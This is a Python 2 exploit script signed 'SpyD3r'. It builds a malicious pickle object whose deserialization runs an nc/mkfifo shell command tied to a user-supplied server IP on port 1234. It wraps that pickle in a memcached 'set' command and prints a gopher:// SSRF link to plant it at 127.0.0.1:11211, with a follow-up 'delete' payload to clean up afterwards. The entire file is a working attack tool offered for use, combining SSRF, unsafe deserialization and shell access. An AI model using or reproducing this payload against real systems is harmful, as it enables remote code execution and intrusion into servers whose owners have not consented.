import cPickle
import os
import urllib

print "\nReady to Get Reverse SHELL\n"
server = raw_input("Give server IP you want to connect : ")

if(not server):
    server = "127.0.0.1"

cmd = "rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l " + server + " 1234 > /tmp/f"

class PickleRCE(object):
    def __reduce__(self):
        if(cmd):
            return (os.system,(cmd,))

command = (cPickle.dumps(PickleRCE()))

def get_payload(command):
    payload = urllib.quote_plus(command).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    finalpayload = "%0d%0aset%20SpyD3r%201%2060%20" + str(len(command)) + "%0d%0a" +  payload + "%0d%0a"
    return finalpayload

print "\nYour gopher link is ready to do SSRF : \n"
print "gopher://127.0.0.1:11211/_" + get_payload(command)

print "\nThen You can connect it with : nc " + server + " 1234"

print "\nAfter everything done, you can delete memcached item by using this payload: \n"
print "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"
print "\n-----------Made-by-SpyD3r-----------\n"